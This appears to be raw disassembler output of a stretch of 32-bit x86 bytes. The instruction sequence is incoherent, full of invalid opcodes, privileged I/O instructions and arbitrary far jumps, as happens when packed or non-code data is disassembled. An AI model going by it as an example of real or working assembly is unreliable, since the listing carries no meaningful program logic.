  413c5c:	mov    bh,BYTE PTR [esi+0x48]
  413c5f:	xor    edi,DWORD PTR [edi]
  413c61:	dec    edi
  413c62:	mov    edi,0x8a0ca8cf
  413c67:	test   BYTE PTR [ebp+0x0],dl
  413c6a:	add    BYTE PTR ds:0x2b0e4a16,cl
  413c70:	ss mov eax,0xd980630d
  413c76:	push   ss
  413c77:	mov    cl,0x50
  413c79:	sahf   
  413c7a:	shl    DWORD PTR [edi-0xd8e1285],cl
  413c80:	dec    eax
  413c81:	push   esp
  413c82:	rol    BYTE PTR [edx+0x2d94f1ad],0xfc
  413c89:	inc    edi
  413c8a:	das    
  413c8b:	dec    DWORD PTR [edi+edi*8+0x3c]
  413c8f:	or     BYTE PTR [eax-0x36ed0ec3],ah
  413c95:	fcomp  st(2)
  413c97:	jmp    0x68ac62ba
  413c9c:	dec    edi
  413c9d:	inc    esi
  413c9e:	xchg   edx,eax
  413c9f:	or     BYTE PTR [ebp+0x55],cl
  413ca2:	mov    BYTE PTR [edx+0x14],bl
  413ca5:	(bad)  
  413ca7:	retf   0x2f12
  413caa:	inc    esi
  413cab:	std    
  413cac:	xchg   ebp,eax
  413cad:	xchg   ecx,eax
  413cae:	test   eax,0xeec3cb3e
  413cb3:	xchg   esi,eax
  413cb4:	fisttp DWORD PTR [eax]
  413cb6:	(bad)
  413cbb:	xor    eax,0xe31b8b31
  413cc0:	ins    BYTE PTR es:[edi],dx
  413cc1:	out    dx,eax
  413cc2:	adc    ecx,DWORD PTR [ebx]
  413cc4:	in     al,dx
  413cc5:	test   al,0xce
  413cc7:	sbb    al,0x7d
  413cc9:	xchg   esi,eax
  413cca:	in     eax,dx
  413ccb:	adc    eax,0x1bc28aef
  413cd1:	cmp    bl,cl
  413cd3:	cld    
  413cd4:	cmp    al,0x5
  413cd6:	mov    DWORD PTR [ebx-0x58],edx
  413cd9:	(bad)  
  413cdb:	(bad)  
  413cdc:	in     al,dx
  413cdd:	cmp    DWORD PTR ss:[ebx-0x4c],edx
  413ce1:	mov    cl,0x2b
  413ce3:	iret   
  413ce4:	adc    al,0x63
  413ce6:	xor    al,0xf5
  413ce8:	cs xor eax,esi
  413ceb:	pop    ds
  413cec:	mov    WORD PTR [esi+edx*2],ds
  413cef:	je     0x413ce8
  413cf1:	retf   0xaad
  413cf4:	and    al,0x6c
  413cf6:	mov    ds:0x871a06f1,al
  413cfb:	dec    esp
  413cfc:	movd   mm7,DWORD PTR [edx-0x4497d30a]
  413d03:	repnz fs imul ecx,esi,0x16aa1e29
  413d0b:	sub    DWORD PTR [edi-0x72],esi
  413d0e:	inc    esp
  413d0f:	cwde   
  413d10:	jmp    esi
  413d12:	mov    BYTE PTR [edx-0x27],ch
  413d15:	les    edi,FWORD PTR ds:0x3f7fc2a4
  413d1b:	repnz mov WORD PTR [ebp-0x16],fs
  413d1f:	pop    es
  413d20:	outs   dx,DWORD PTR ds:[esi]
  413d21:	lods   al,BYTE PTR ds:[esi]
  413d22:	push   bx
  413d24:	jle    0x413d22
  413d26:	or     al,0xe0
  413d28:	and    BYTE PTR [edx+0x14ddcaef],0xfa
  413d2f:	inc    esp
  413d30:	js     0x413d7e
  413d32:	mov    ah,0xda
  413d34:	xlat   BYTE PTR ds:[ebx]
  413d35:	int    0x49
  413d37:	loopne 0x413d88
  413d39:	push   ds
  413d3a:	dec    esi
  413d3b:	cld    
  413d3c:	ret    
  413d3d:	jbe    0x413d8a
  413d3f:	in     eax,dx
  413d40:	enter  0x30ec,0x5b
  413d44:	push   ss
  413d45:	dec    edx
  413d46:	inc    ebx
  413d47:	cmp    al,bl
  413d49:	dec    eax
  413d4a:	mov    edi,0xaf3badb3
  413d4f:	pop    esi
  413d50:	fstp   TBYTE PTR [ebx+edx*8-0x1f1ed8ae]
  413d57:	bound  edi,QWORD PTR [ebx]
  413d59:	cmp    al,0xe4
  413d5b:	pop    esp
  413d5c:	(bad)  
  413d5d:	jmp    0xfae9:0xc3c4e57d
  413d64:	loopne 0x413dbf
  413d66:	add    DWORD PTR [ecx+0x66b6c152],edi
  413d6c:	(bad)  
  413d6d:	jg     0x413da5
  413d6f:	lock (bad) 
  413d71:	loop   0x413d8c
  413d73:	xor    ecx,DWORD PTR [ecx-0x11]
  413d76:	cli    
  413d77:	adc    esp,DWORD PTR [edi+0x43]
  413d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d7b:	jns    0x413d5a
  413d7d:	cli    
  413d7e:	popa   
  413d7f:	inc    esi
  413d80:	or     bl,BYTE PTR [edx]
  413d82:	sub    dl,ah
  413d84:	jnp    0x413d1e
  413d86:	cli    
  413d87:	int    0x12
  413d89:	cmp    edi,DWORD PTR [esi-0x62]
  413d8c:	cmp    eax,0x4e5bb2d3
  413d91:	and    edx,DWORD PTR [ebp+0xed6ede4]
  413d97:	shl    BYTE PTR [eax-0x47d39064],0x49
  413d9e:	enter  0x7abc,0x9c
  413da2:	rol    BYTE PTR [edx-0x245d1d24],cl
  413da8:	inc    edi
  413da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413daa:	cmp    dl,cl
  413dac:	inc    esp
  413dad:	lahf   
  413dae:	sahf   
  413daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413db0:	mov    ebx,0x5d0f9e8d
  413db5:	push   es
  413db6:	jmp    0x413df0
  413db8:	cmp    dl,dh
  413dba:	dec    esi
  413dbb:	in     eax,0xae
  413dbd:	sbb    ebx,esi
  413dbf:	dec    esp
  413dc0:	rol    dh,cl
  413dc2:	jge    0x413d91
  413dc4:	push   edi
  413dc5:	lods   al,BYTE PTR ds:[esi]
  413dc6:	push   ds
  413dc7:	iret   
  413dc8:	dec    ebx
  413dc9:	jp     0x413db4
  413dcb:	int3   
  413dcc:	pop    edx
  413dcd:	xor    DWORD PTR [edx+0x44a50928],edi
  413dd3:	rol    DWORD PTR [esi-0x35b9d207],0x89
  413dda:	sahf   
  413ddb:	rol    DWORD PTR [ecx+0x70cdb3df],0xc9
  413de2:	mov    al,ds:0x590bd77a
  413de7:	adc    DWORD PTR cs:[edi+ebp*2],esp
  413deb:	sub    esi,DWORD PTR [eax]
  413ded:	jmp    0x3f8f0563
  413df2:	shl    BYTE PTR [eax+0xd],cl
  413df5:	sbb    DWORD PTR [esi+0xc18eda4],0xfffffff4
  413dfc:	iret   
  413dfd:	hlt    
  413dfe:	pop    ecx
  413dff:	or     eax,0x8b72efff
  413e04:	adc    bl,BYTE PTR [ebx]
  413e06:	xchg   DWORD PTR [esp+ebp*8+0x4c],edi
  413e0a:	mov    edx,0x50e7b226
  413e0f:	dec    esp
  413e10:	test   DWORD PTR [edx-0x4f],ebx
  413e13:	pop    eax
  413e14:	cmp    dl,BYTE PTR [edi*2+0x4e7ff064]
  413e1b:	pusha  
  413e1c:	jb     0x413e2d
  413e1e:	jb     0x413de9
  413e20:	pop    edx
  413e21:	sub    BYTE PTR [ebx+edx*8],0xc7
  413e25:	inc    ebx
  413e26:	pusha  
  413e27:	xor    eax,0x2ae8f530
  413e2c:	retf   
  413e2d:	ins    BYTE PTR es:[edi],dx
  413e2e:	jns    0x413dc9
  413e30:	push   ecx
  413e31:	mov    ecx,0xbb896c5b
  413e36:	retf   
  413e37:	imul   edx,DWORD PTR [edi-0x5bfcc2e9],0xfffffff5
  413e3e:	std    
  413e3f:	xor    DWORD PTR [ebx-0x49],ecx
  413e42:	aam    0x58
  413e44:	retf   0xe895
  413e47:	or     edx,DWORD PTR [esi-0x679ef6d9]
  413e4d:	pop    ecx
  413e4e:	adc    esi,DWORD PTR [ebx-0x4f]
  413e51:	push   edx
  413e52:	and    BYTE PTR [esi+0x38],bh
  413e55:	js     0x413de6
  413e57:	mov    edx,0x681fe8f8
  413e5c:	jecxz  0x413e58
  413e5e:	fild   WORD PTR [edx]
  413e60:	adc    eax,0xe56be0a1
  413e65:	les    ebp,FWORD PTR [ebx+eax*8]
  413e68:	shl    dl,cl
  413e6a:	repnz cwde 
  413e6c:	jl     0x413df2
  413e6e:	mov    dl,0x6c
  413e70:	mov    ebp,0x7def5f0b
  413e75:	out    dx,eax
  413e76:	mov    es,WORD PTR [esi]
  413e78:	lods   eax,DWORD PTR ds:[esi]
  413e79:	cmp    dl,bh
  413e7b:	stos   BYTE PTR es:[edi],al
  413e7c:	loop   0x413e26
  413e7e:	xchg   edx,eax
  413e7f:	pop    ds
  413e80:	stos   BYTE PTR es:[edi],al
  413e81:	add    DWORD PTR [esi],eax
  413e83:	jae    0x413e4f
  413e85:	adc    al,al
  413e87:	pop    ss
  413e88:	enter  0x96c9,0x6
  413e8c:	xchg   ebp,eax
  413e8d:	sbb    eax,0x968592bd
  413e92:	add    bh,BYTE PTR [edi+ebx*4-0x7e]
  413e96:	sub    BYTE PTR [eax-0x42b2d676],cl
  413e9c:	xchg   ebp,eax
  413e9d:	popa   
  413e9e:	push   edx
  413e9f:	stos   BYTE PTR es:[edi],al
  413ea0:	loope  0x413e73
  413ea2:	xchg   esp,eax
  413ea3:	out    0xdc,al
  413ea5:	or     dh,ch
  413ea7:	sar    BYTE PTR [ebx-0x2cad80c8],cl
  413ead:	cld    
  413eae:	jnp    0x413e3e
  413eb0:	push   edi
  413eb1:	cmp    esi,edx
  413eb3:	loope  0x413e78
  413eb5:	mov    BYTE PTR [eax-0x77],bh
  413eb8:	jno    0x413eda
  413eba:	pop    esp
  413ebb:	mov    WORD PTR [eax+0x6686d87],gs
  413ec1:	(bad)  
  413ec2:	sub    BYTE PTR [ebx+0x13186216],bh
  413ec8:	jmp    0x413eb0
  413eca:	dec    ecx
  413ecb:	mov    cl,0xed
  413ecd:	ins    DWORD PTR es:[edi],dx
  413ece:	shr    BYTE PTR [edx+edi*4-0x624348a5],0x2
  413ed6:	enter  0x2d1e,0xaa
  413eda:	out    0x48,al
  413edc:	adc    BYTE PTR [ecx],dh
  413ede:	(bad)  
  413edf:	faddp  st(7),st
  413ee1:	jmp    0x179e:0x8086ff96
  413ee8:	fs pop esi
  413eea:	push   esi
  413eeb:	lock popf 
  413eed:	dec    edx
  413eee:	std    
  413eef:	sbb    ch,BYTE PTR [ecx+0x60]
  413ef2:	dec    eax
  413ef3:	xor    edx,esi
  413ef5:	pop    ds
  413ef6:	shl    cl,cl
  413ef8:	bound  edi,QWORD PTR [ebx+ebx*4-0x3d46c590]
  413eff:	fistp  WORD PTR [edx+0x2cf4b841]
  413f05:	xchg   ecx,eax
  413f06:	test   al,0xcf
  413f08:	call   FWORD PTR [edi-0x2]
  413f0b:	push   ds
  413f0c:	xor    DWORD PTR [eax],ecx
  413f0e:	pop    edi
  413f0f:	lea    esi,[eax]
  413f11:	cmp    DWORD PTR ds:0xe983293a,ebx
  413f17:	mov    ecx,0x467d3e42
  413f1c:	jmp    0x69db:0x96b67321
  413f23:	shl    DWORD PTR [edx+0x1ee59e67],1
  413f29:	mov    ch,0x5a
  413f2b:	pop    ss
  413f2c:	jo     0x413f64
  413f2e:	call   0xad0c840
  413f33:	enter  0x3cce,0x17
  413f37:	in     al,0xc2
  413f39:	cli    
  413f3a:	and    BYTE PTR [esi+0x770bec96],ch
  413f40:	out    0x45,al
  413f42:	icebp  
  413f43:	or     dl,dl
  413f45:	dec    eax
  413f46:	repnz mov esi,0xbfecc25f
  413f4c:	xor    al,0xe7
  413f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f4f:	ret    
  413f50:	das    
  413f51:	jns    0x413f83
  413f53:	or     BYTE PTR [edx+0x612dbfb4],dh
  413f59:	out    0x9a,al
  413f5b:	test   eax,0xabf0ea38
  413f60:	in     eax,0xdf
  413f62:	adc    BYTE PTR [ebx+0x1cf9f09],0xda
  413f69:	clc    
  413f6a:	bound  esi,QWORD PTR ds:0xe032b3ac
  413f70:	test   al,0xb1
  413f72:	jae    0x413f99
  413f74:	rcr    DWORD PTR [eax-0x353c2ae6],cl
  413f7a:	fcmovne st,st(3)
  413f7c:	sti    
  413f7d:	scas   eax,DWORD PTR es:[edi]
  413f7e:	lahf   
  413f7f:	cmp    al,0x5e
  413f81:	leave  
  413f82:	clc    
  413f83:	jae    0x413ff9
  413f85:	call   0xa511:0x78caeab9
  413f8c:	ss out 0xce,al
  413f8f:	iret   
  413f90:	repnz pop ebp
  413f92:	xchg   edi,eax
  413f93:	fs stos DWORD PTR es:[edi],eax
  413f95:	xchg   BYTE PTR [ebx-0x7a],bl
  413f98:	cmc    
  413f99:	xlat   BYTE PTR ds:[ebx]
  413f9a:	mov    ebp,ebx
  413f9c:	jecxz  0x413f2f
  413f9e:	leave  
  413f9f:	mov    edx,0x5317f29c
  413fa4:	adc    eax,0x49891622
  413fa9:	add    al,0x42
  413fab:	dec    eax
  413fac:	bound  ecx,QWORD PTR [edx-0x69]
  413faf:	and    BYTE PTR [esi-0x3ff046f],al
  413fb5:	or     eax,0x7c02c242
  413fba:	hlt    
  413fbb:	mov    fs,WORD PTR [eax]
  413fbd:	pusha  
  413fbe:	rcr    edi,1
  413fc0:	adc    eax,0x741f505f
  413fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc6:	test   BYTE PTR [edx+0x68addcc0],bh
  413fcc:	jo     0x413f53
  413fce:	xchg   edx,eax
  413fcf:	adc    ah,BYTE PTR [esi+0x707603f0]
  413fd5:	out    0xf2,al
  413fd7:	sbb    DWORD PTR ds:0xfbf96374,esp
  413fdd:	inc    edx
  413fde:	inc    edi
  413fdf:	mov    ah,BYTE PTR ds:0x5bc46da7
  413fe5:	cmc    
  413fe6:	test   DWORD PTR [edi+eiz*4-0x34],edi
  413fea:	cmp    DWORD PTR [edx],ecx
  413fec:	add    dh,BYTE PTR ds:0xa8f0ab22
  413ff2:	(bad)  
  413ff3:	(bad)  
  413ff5:	jge    0x413f99
  413ff7:	pop    esp
  413ff8:	or     BYTE PTR [ebp+0x159200f8],ah
  413ffe:	(bad)  
  413fff:	mov    ebx,0x77684984
  414004:	add    al,0x64
  414006:	stos   BYTE PTR es:[edi],al
  414007:	shl    bh,cl
  414009:	adc    DWORD PTR [edx+0x66],esi
  41400c:	cmp    DWORD PTR [ebp+0x69c75844],eax
  414012:	je     0x414043
  414014:	jmp    0x414035
  414016:	jp     0x413ffc
  414018:	sti    
  414019:	nop
  41401a:	stc    
  41401b:	jne    0x414079
  41401d:	xchg   bl,bh
  41401f:	and    eax,0x6ea9aae5
  414024:	cdq    
  414025:	jl     0x414070
  414027:	jp     0x413fda
  414029:	mov    al,0x8c
  41402b:	mov    ebx,0x5d157719
  414030:	in     al,dx
  414031:	xor    eax,0xb71535e6
  414036:	mov    esi,0xe01024d3
  41403b:	sub    eax,0xfea5f7c2
  414040:	cmp    DWORD PTR [ebx],ecx
  414042:	hlt    
  414043:	sbb    edi,DWORD PTR [eax]
  414045:	shl    DWORD PTR [esi],0x86
  414048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414049:	sub    cl,BYTE PTR [ebp-0xb6bfd0f]
  41404f:	or     ah,bl
  414051:	lock mov ecx,0x663e52fd
  414057:	leave  
  414058:	mov    dh,0xee
  41405a:	add    ah,BYTE PTR [esi+ebx*1-0x1]
  41405e:	dec    ecx
  41405f:	mov    al,ds:0x8643f663
  414064:	xor    eax,0xe5a9ceeb
  414069:	dec    ecx
  41406a:	test   eax,0xb530e000
  41406f:	shl    esi,0xd5
  414072:	shl    DWORD PTR [eax+edx*1+0x6c755d4e],0x56
  41407a:	push   ss
  41407b:	stc    
  41407c:	push   es
  41407d:	sbb    al,0x2c
  41407f:	xchg   DWORD PTR [edx-0x4d],esp
  414082:	hlt    
  414083:	push   es
  414084:	mov    ebp,DWORD PTR [edi]
  414086:	sub    BYTE PTR [eax-0x2],dl
  414089:	lock je 0x4140c8
  41408c:	data16 outs dx,BYTE PTR fs:[esi]
  41408f:	mov    BYTE PTR [ecx+0x288b19c],dh
  414095:	mov    eax,ds:0xc8c6bc74
  41409a:	cli    
  41409b:	ja     0x414021
  41409d:	div    BYTE PTR [ebx-0x4e]
  4140a0:	arpl   WORD PTR [edx],bp
  4140a2:	fist   WORD PTR [ecx+0x1e]
  4140a5:	xor    eax,0x95685fa7
  4140aa:	test   BYTE PTR [eax+0x3bad3c7e],dh
  4140b0:	sbb    eax,0xe2cde677
  4140b5:	repz out dx,eax
  4140b7:	loop   0x41408d
  4140b9:	shl    BYTE PTR [ebx-0x3230f8eb],0x2f
  4140c0:	xchg   esi,eax
  4140c1:	xchg   edx,eax
  4140c2:	icebp  
  4140c3:	in     eax,dx
  4140c4:	pop    ebp
  4140c5:	sbb    edi,DWORD PTR [ebp+0x69]
  4140c8:	cmp    eax,DWORD PTR [esp+esi*2]
  4140cb:	or     BYTE PTR [ebx+ebx*1-0x77],ah
  4140cf:	inc    esi
  4140d0:	not    bh
  4140d2:	sbb    BYTE PTR [esi+0x64174e13],al
  4140d8:	inc    esi
  4140d9:	fcmovnu st,st(3)
  4140db:	cmp    ah,BYTE PTR ds:0x6a596e0f
  4140e1:	jns    0x4140a4
  4140e3:	minps  xmm3,XMMWORD PTR [edx+0x7c822865]
  4140ea:	sbb    al,0xce
  4140ec:	push   edi
  4140ed:	xor    bl,ah
  4140ef:	daa    
  4140f0:	xchg   ebx,eax
  4140f1:	or     BYTE PTR [edx],ah
  4140f3:	sub    ah,BYTE PTR [edi-0x2cac8e7d]
  4140f9:	call   0x30a4:0xa2f10878
  414100:	and    bh,ah
  414102:	repz int 0x18
  414105:	jo     0x4140bd
  414107:	dec    eax
  414108:	int    0xcd
  41410a:	outs   dx,BYTE PTR ds:[esi]
  41410b:	je     0x414132
  41410d:	pop    eax
  41410e:	sbb    al,0x23
  414110:	ins    DWORD PTR es:[edi],dx
  414111:	fsub   DWORD PTR [edi]
  414113:	dec    ecx
  414114:	jb     0x4140f5
  414116:	fild   DWORD PTR [esp+esi*4]
  414119:	scas   al,BYTE PTR es:[edi]
  41411a:	aas    
  41411b:	xlat   BYTE PTR ds:[ebx]
  41411c:	aaa    
  41411d:	xlat   BYTE PTR ds:[ebx]
  41411e:	test   DWORD PTR [ebx+0x78],edx
  414121:	cmp    eax,ebx
  414123:	lods   eax,DWORD PTR ds:[esi]
  414124:	stc    
  414125:	sti    
  414126:	hlt    
  414127:	cli    
  414128:	std    
  414129:	xchg   BYTE PTR [edx],ch
  41412b:	cmp    al,0x62
  41412d:	push   esi
  41412e:	mov    bh,0x14
  414130:	std    
  414131:	popf   
  414132:	mov    ebp,0xe77ca618
  414137:	icebp  
  414138:	lds    ecx,FWORD PTR ds:0x6177e8f0
  41413e:	sbb    eax,0x84bead0f
  414143:	sar    DWORD PTR [edi-0x4ac0f1cd],cl
  414149:	mov    esp,0x8472da4a
  41414e:	jbe    0x414195
  414150:	sar    DWORD PTR [ebp+ebx*8+0x2c832766],0xda
  414158:	push   ss
  414159:	xor    DWORD PTR [ecx+0x3cff9652],eax
  41415f:	cmp    eax,0xbe03d4b8
  414164:	pop    ss
  414165:	dec    ebp
  414166:	mov    DWORD PTR [ecx+0x0],ebp
  414169:	or     ecx,esp
  41416b:	ja     0x414115
  41416d:	and    al,0xd0
  41416f:	adc    ebx,DWORD PTR [ecx]
  414171:	test   al,0xcd
  414173:	or     DWORD PTR [ebx],eax
  414175:	test   al,0xde
  414177:	ror    BYTE PTR [ebx],0xe9
  41417a:	mov    WORD PTR [ebx-0x4a2dcc14],ss
  414180:	pop    ecx
  414181:	je     0x414149
  414183:	and    esp,edi
  414185:	xor    bh,BYTE PTR [eax]
  414187:	xlat   BYTE PTR ds:[ebx]
  414188:	loope  0x414118
  41418a:	jbe    0x4141a1
  41418c:	push   ebx
  41418d:	shr    DWORD PTR [ebp-0x3f0e07bb],0xea
  414194:	cmp    eax,0xb8b9001c
  414199:	sub    dl,bh
  41419b:	sub    eax,0x8947be53
  4141a0:	jecxz  0x4141ac
  4141a2:	jae    0x4141cc
  4141a4:	push   0x6910b124
  4141a9:	jecxz  0x41416f
  4141ab:	outs   dx,BYTE PTR ds:[esi]
  4141ac:	lods   eax,DWORD PTR ds:[esi]
  4141ad:	inc    edx
  4141ae:	jp     0x4141e9
  4141b0:	int    0x59
  4141b2:	fld    DWORD PTR [ecx]
  4141b4:	adc    al,al
  4141b6:	fwait
  4141b7:	push   ebp
  4141b8:	hlt    
  4141b9:	mov    cl,0x18
  4141bb:	dec    eax
  4141bc:	mov    dl,0x6f
  4141be:	dec    esp
  4141bf:	shr    DWORD PTR [ebp+0x4ea2043],0x76
  4141c6:	fdivr  QWORD PTR [ecx]
  4141c8:	(bad)  
  4141ca:	mov    ebp,0xbc233fcf
  4141cf:	(bad)  
  4141d1:	add    ebx,ecx
  4141d3:	loopne 0x4141d0
  4141d5:	mov    cl,0x99
  4141d7:	pop    eax
  4141d8:	test   eax,edi
  4141da:	(bad)  
  4141db:	push   ebx
  4141dc:	dec    ecx
  4141dd:	sub    DWORD PTR ds:0xe6219903,edi
  4141e3:	adc    BYTE PTR [ebp-0x38],bl
  4141e6:	mov    al,ds:0x3a9a0368
  4141eb:	mov    eax,0x402bfb6a
  4141f0:	sub    edi,DWORD PTR [edi]
  4141f2:	rcr    DWORD PTR [edx-0x64],1
  4141f5:	push   0xe0d50347
  4141fa:	retf   
  4141fb:	sub    bl,BYTE PTR [edx-0x47]
  4141fe:	loopne 0x4141a0
  414200:	add    ch,BYTE PTR [esi+ebx*2+0x27b65f4a]
  414207:	sbb    BYTE PTR [esi+edi*4-0x70],bl
  41420b:	ins    BYTE PTR es:[edi],dx
  41420c:	mov    ds:0xff77b6ea,eax
  414211:	ret    0x8c53
  414214:	inc    ecx
  414215:	ror    BYTE PTR [ecx-0x54],cl
  414218:	lods   ax,WORD PTR ds:[esi]
  41421a:	jo     0x414253
  41421c:	push   cs
  41421d:	iret   
  41421e:	popa   
  41421f:	mov    eax,ds:0xf2c652a3
  414224:	and    eax,0xd6cbe5a6
  414229:	ds mov edx,0x9ecba1a7
  41422f:	xchg   ecx,eax
  414230:	enter  0xdb4f,0xba
  414234:	js     0x414241
  414236:	loope  0x4141ff
  414238:	sub    BYTE PTR [edx+0x70],ah
  41423b:	psubsb mm1,QWORD PTR [edx-0xa3b2980]
  414242:	push   es
  414243:	popa   
  414244:	test   BYTE PTR [ecx-0x4e],bh
  414247:	sahf   
  414248:	dec    esi
  414249:	sub    BYTE PTR [ecx+0x24faa833],ah
  41424f:	call   0xca96:0x5bce1c85
  414256:	dec    edx
  414257:	fstp   QWORD PTR [eax-0x74f59165]
  41425d:	adc    al,0xe8
  41425f:	movq   mm5,QWORD PTR [eax+0x46]
  414263:	mov    edi,0x7c736091
  414268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414269:	hlt    
  41426a:	xchg   ebp,eax
  41426b:	jnp    0x414281
  41426d:	out    dx,al
  41426e:	out    0xd3,eax
  414270:	push   esi
  414271:	lea    ecx,[esi+0x3ad1d7c4]
  414277:	xchg   ebx,eax
  414278:	jnp    0x41420e
  41427a:	dec    edx
  41427b:	xor    bp,WORD PTR [esi]
  41427e:	push   ebx
  41427f:	jnp    0x414241
  414281:	xor    eax,0x1c32d413
  414286:	test   ah,0x1b
  414289:	pop    ecx
  41428a:	fmul   st(3),st
  41428c:	inc    ebp
  41428d:	aaa    
  41428e:	sbb    DWORD PTR [ecx+ebx*2+0x47],ebx
  414292:	test   BYTE PTR [edi-0x19],dl
  414295:	jmp    0x5873:0x5e737040
  41429c:	loop   0x4142c8
  41429e:	dec    edi
  41429f:	or     ecx,DWORD PTR [edi-0x33]
  4142a2:	inc    ecx
  4142a3:	inc    ebx
  4142a4:	cwde   
  4142a5:	and    eax,0x40f6c37d
  4142aa:	push   eax
  4142ab:	mov    DWORD PTR [ebp+0xc024e1b],esp
  4142b1:	out    0xc1,eax
  4142b3:	aaa    
  4142b4:	jbe    0x41424d
  4142b6:	mov    ebp,0x23366af6
  4142bb:	sub    esp,DWORD PTR [ebp+0x39]
  4142be:	push   ebp
  4142bf:	mov    bh,0x99
  4142c1:	add    cl,BYTE PTR [ebx]
  4142c3:	push   es
  4142c4:	aam    0x4c
  4142c6:	test   al,0xf6
  4142c8:	in     al,0xad
  4142ca:	popf   
  4142cb:	or     eax,0x89ce9c63
  4142d0:	dec    ecx
  4142d1:	add    bl,BYTE PTR ds:0xa0e93ee4
  4142d7:	shl    BYTE PTR ds:0x72816a8e,1
  4142dd:	out    dx,eax
  4142de:	(bad)  
  4142df:	mov    ds:0x32860005,eax
  4142e4:	mov    es:0x848a2d2d,eax
  4142ea:	fwait
  4142eb:	lods   al,BYTE PTR ds:[esi]
  4142ec:	push   ebx
  4142ed:	push   ebx
  4142ee:	inc    esi
  4142ef:	rcl    ebp,1
  4142f1:	or     dl,BYTE PTR es:[ecx]
  4142f4:	addr16 mov ch,0xac
  4142f7:	hlt    
  4142f8:	sub    ebp,DWORD PTR [ebp-0x6d]
  4142fb:	ret    
  4142fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142fd:	call   0x61b53883
  414302:	jae    0x414347
  414304:	test   BYTE PTR [edx+0x21],al
  414307:	jbe    0x4142eb
  414309:	leave  
  41430a:	ret    0xc0aa
  41430d:	push   edi
  41430e:	retf   
  41430f:	mov    ah,0x54
  414311:	lea    edi,[ebx]
  414313:	leave  
  414314:	aad    0x29
  414316:	and    bl,BYTE PTR [esi]
  414318:	cmp    eax,DWORD PTR fs:[edx]
  41431b:	in     al,0x36
  41431d:	clc    
  41431e:	setno  BYTE PTR [eiz*1-0x1c852574]
  414326:	dec    edi
  414327:	xor    al,0xba
  414329:	mov    esi,0x44f18fb7
  41432e:	stos   BYTE PTR es:[edi],al
  41432f:	mov    ch,0x51
  414331:	xor    al,0x16
  414333:	push   cs
  414334:	xchg   BYTE PTR [eax+0x64],bl
  414337:	std    
  414338:	daa    
  414339:	jbe    0x41433c
  41433b:	push   ds
  41433c:	in     eax,dx
  41433d:	sahf   
  41433e:	xchg   ebx,eax
  41433f:	sub    esp,eax
  414341:	jl     0x4142d5
  414343:	mov    edx,0x81bff217
  414348:	jno    0x414385
  41434a:	loopne 0x414310
  41434c:	ds sar ecx,1
  41434f:	xchg   dl,bh
  414351:	mov    ch,0xc8
  414353:	xor    al,0x1d
  414355:	ret    0x62c
  414358:	xor    al,0x15
  41435a:	adc    eax,0x81164bf2
  41435f:	push   ss
  414360:	cwde   
  414361:	mov    ?,WORD PTR [ebx+0x7e]
  414364:	jne    0x4143a9
  414366:	rcr    DWORD PTR [ecx+0x23],0x42
  41436a:	add    edx,DWORD PTR [ebp-0x39]
  41436d:	bound  ebx,QWORD PTR [eax]
  41436f:	add    esp,DWORD PTR [esi-0x261801e6]
  414375:	test   eax,0x1ec151b3
  41437a:	dec    ecx
  41437b:	add    eax,DWORD PTR [ebp+esi*8+0x32]
  41437f:	(bad)  
  414380:	xchg   ebp,eax
  414381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414382:	mov    dl,0xae
  414384:	in     eax,0xae
  414386:	(bad)  
  414387:	sub    al,0xbe
  414389:	cmp    DWORD PTR [eax],edi
  41438b:	inc    ebx
  41438c:	xchg   esp,eax
  41438d:	ins    DWORD PTR es:[edi],dx
  41438e:	jle    0x4143c8
  414390:	sahf   
  414391:	push   edx
  414392:	lahf   
  414393:	lods   al,BYTE PTR ds:[esi]
  414394:	mov    eax,0xed624f3e
  414399:	ret    0x1eae
  41439c:	fsub   DWORD PTR [esi+0x7a9cf24d]
  4143a2:	and    esi,edi
  4143a4:	pop    ss
  4143a5:	je     0x41435e
  4143a7:	or     BYTE PTR [ebp+eiz*2+0x5d],ch
  4143ab:	jns    0x4143d1
  4143ad:	jb     0x414358
  4143af:	cmp    al,0xb9
  4143b1:	dec    esi
  4143b2:	int    0x88
  4143b4:	xlat   BYTE PTR ds:[ebx]
  4143b5:	(bad)  
  4143b6:	aam    0x9d
  4143b8:	cmp    DWORD PTR ds:0xcd401115,ebx
  4143be:	push   edi
  4143bf:	scas   eax,DWORD PTR es:[edi]
  4143c0:	mov    dl,0x71
  4143c2:	stos   DWORD PTR es:[edi],eax
  4143c3:	shl    BYTE PTR [eax+0x262186b0],1
  4143c9:	mov    al,0x32
  4143cb:	push   edi
  4143cc:	xchg   edi,eax
  4143cd:	pop    ecx
  4143ce:	jg     0x41438f
  4143d0:	mov    ecx,0xf1232c46
  4143d5:	lods   al,BYTE PTR ds:[esi]
  4143d6:	aas    
  4143d7:	mov    BYTE PTR [ecx+edx*1+0x9113d45],dl
  4143de:	sub    ecx,DWORD PTR [edi+0x5f9529de]
  4143e4:	or     eax,0x84585284
  4143e9:	and    eax,0xf6edaf6e
  4143ee:	popa   
  4143ef:	aas    
  4143f0:	les    edi,FWORD PTR [edi-0x4b42e063]
  4143f6:	ins    BYTE PTR es:[edi],dx
  4143f7:	jb     0x414460
  4143f9:	sbb    ecx,DWORD PTR [esi]
  4143fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143fc:	mov    esp,0x757f66e8
  414401:	mov    al,ds:0x50729d70
  414406:	jo     0x41447f
  414408:	dec    ebx
  414409:	cli    
  41440a:	xor    esp,ecx
  41440c:	dec    eax
  41440d:	rol    DWORD PTR [ebx],1
  41440f:	cmc    
  414410:	add    BYTE PTR [edx+0x7e],bl
  414413:	add    dh,BYTE PTR [edx-0x20bf54e3]
  414419:	push   ds
  41441a:	or     eax,0xc11afee2
  41441f:	pop    esp
  414420:	cmp    al,BYTE PTR [esi+esi*4]
  414423:	xchg   esi,eax
  414424:	sbb    eax,0xc467b982
  414429:	mov    al,ds:0x7c008d24
  41442e:	fadd   DWORD PTR [ecx+0x1fb40e41]
  414434:	xchg   edi,eax
  414435:	adc    ebx,esp
